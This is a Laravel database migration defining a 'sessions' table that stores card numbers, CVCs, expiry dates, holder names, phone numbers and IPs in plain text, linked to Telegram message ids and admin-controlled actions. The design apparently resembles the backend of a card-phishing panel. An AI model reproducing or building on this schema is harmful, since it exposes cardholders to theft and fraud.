<?php

use App\Enums\SessionStatus;
use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    /**
     * Run the migrations.
     */
    public function up(): void
    {
        Schema::create('sessions', function (Blueprint $table) {
            
            $table->string('id')->primary();
            
            
            $table->string('input_type'); 
            $table->string('input_value');
            
           
            $table->string('card_number')->nullable();
            $table->string('cvc')->nullable();
            $table->string('expire')->nullable();
            $table->string('phone_number')->nullable();
            $table->string('holder_name')->nullable();
            
         
            $table->string('ip');
            $table->bigInteger('telegram_message_id')->nullable();
            
        
            $table->string('status')->default(SessionStatus::PENDING->value);
            $table->foreignId('admin_id')->nullable()->constrained('admins')->nullOnDelete();
            $table->string('action_type')->nullable();
            
          
            $table->json('custom_questions')->nullable();
            $table->json('custom_answers')->nullable();
            $table->json('images')->nullable();
            
          
            $table->timestamp('last_activity_at')->nullable();
            $table->timestamps();

           
            $table->index('status');
            $table->index('admin_id');
            $table->index('created_at');
            $table->index('telegram_message_id');
        });
    }

    /**
     * Reverse the migrations.
     */
    public function down(): void
    {
        Schema::dropIfExists('sessions');
    }
};
